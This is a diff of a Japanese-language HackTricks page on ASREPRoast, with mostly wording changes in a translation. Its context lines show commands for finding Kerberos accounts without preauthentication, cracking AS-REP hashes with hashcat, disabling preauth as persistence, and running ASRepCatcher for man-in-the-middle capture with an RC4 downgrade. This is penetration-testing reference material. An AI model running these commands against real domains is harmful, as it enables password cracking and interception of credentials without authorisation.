@@ -6,42 +6,40 @@
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見る
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする。
-* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする。
+* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！
+経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加しましょう！
 
 **ハッキングの洞察**\
-ハッキングのスリルと挑戦に深く入り込むコンテンツに参加
+ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう
 
 **リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、ハッキングの世界の速いペースについていく
+リアルタイムのニュースと洞察を通じて、ハッキングの世界の速いペースについていきましょう
 
-**最新のアナウンス**\
-最新のバグバウンティの開始や重要なプラットフォームのアップデートについての情報を入手
+**最新の発表**\
+最新のバグバウンティの開始や重要なプラットフォームの更新について情報を得ましょう
 
-**[**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、今日からトップハッカーと協力を始めましょう！
+**[**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、今日からトップハッカーと協力しましょう！
 
 ## ASREPRoast
 
-ASREPRoastは、**Kerberos事前認証が必要な属性**を持たないユーザーを標的とするセキュリティ攻撃です。基本的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずに、ドメインコントローラー（DC）からユーザーの認証をリクエストできます。その後、DCは、ユーザーのパスワード由来のキーで暗号化されたメッセージで応答し、攻撃者はオフラインでユーザーのパスワードを発見するためにクラックを試みることができます。
+ASREPRoast は、**Kerberos事前認証が必要な属性**を持たないユーザーを標的とするセキュリティ攻撃です。基本的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずに、ドメインコントローラー（DC）からユーザーの認証をリクエストできます。その後、DCは、ユーザーのパスワード由来のキーで暗号化されたメッセージで応答し、攻撃者はオフラインでユーザーのパスワードを発見するためにクラックを試みることができます。
 
-この攻撃の主な要件は次のとおりです：
-- **Kerberos事前認証の不足**：標的となるユーザーは、このセキュリティ機能が有効になっていない必要があります。
-- **ドメインコントローラー（DC）への接続**：攻撃者は、リクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
-- **オプションのドメインアカウント**：ドメインアカウントを持っていると、LDAPクエリを使用して脆弱なユーザーを効率的に特定できます。このようなアカウントがない場合、攻撃者はユーザー名を推測する必要があります。
+この攻撃の主な要件は次のとおりです:
 
+* **Kerberos事前認証の不足**: 対象ユーザーは、このセキュリティ機能が有効になっていない必要があります。
+* **ドメインコントローラー（DC）への接続**: 攻撃者は、リクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
+* **オプションのドメインアカウント**: ドメインアカウントを持っていると、LDAPクエリを使用して脆弱なユーザーを効率的に特定できます。このようなアカウントがない場合、攻撃者はユーザー名を推測する必要があります。
 
 #### 脆弱なユーザーの列挙（ドメイン資格情報が必要）
-
-{% code title="Windowsを使用する" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -51,6 +49,8 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
+{% endcode %}
+
 #### AS_REPメッセージのリクエスト
 
 {% code title="Linuxを使用する" %}
@@ -80,7 +80,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### 持続性
 
-**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を必要としないように強制する：
+**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を必要としないように強制します：
 
 {% code title="Windows を使用する" %}
 ```bash
@@ -95,8 +95,9 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 {% endcode %}
 
 ## 資格情報なしでのASREProast
-攻撃者は、ネットワークを通過するAS-REPパケットをキャプチャするために、Kerberosの事前認証が無効になっているかどうかに関係なく、中間者攻撃を使用できます。したがって、これはVLAN上のすべてのユーザーに対して機能します。<br>
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)を使用すると、これが可能です。さらに、このツールは、Kerberosの交渉を変更することで、クライアントワークステーションにRC4を使用させることができます。
+
+攻撃者は、Kerberos事前認証が無効になっている必要がない状態で、中間者攻撃を使用して、ネットワークを通過するAS-REPパケットをキャプチャすることができます。したがって、これはVLAN上のすべてのユーザーに対して機能します。\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)を使用すると、これを行うことができます。さらに、このツールは、Kerberosのネゴシエーションを変更して、クライアントワークステーションにRC4を使用させるように強制します。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -113,7 +114,7 @@ ASRepCatcher listen
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！
 
@@ -123,21 +124,21 @@ ASRepCatcher listen
 **リアルタイムハックニュース**\
 リアルタイムのニュースと洞察を通じて、ハッキングの世界を追いかけましょう
 
-**最新の発表**\
-最新のバグバウンティの開始や重要なプラットフォームの更新情報を把握しましょう
+**最新のお知らせ**\
+最新のバグバウンティの開始や重要なプラットフォームのアップデートについて知っておきましょう
 
 **[Discord](https://discord.com/invite/N3FrSbmwdy)** に参加して、今日からトップハッカーと協力を始めましょう！
 
 <details>
 
-<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** でAWSハッキングをゼロからヒーローまで学びましょう！</strong></summary>
+<summary><strong>**ゼロからヒーローまでのAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
-* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングトリックを共有してください。
+* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** をフォローする。**
+* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出する。
 
 </details>
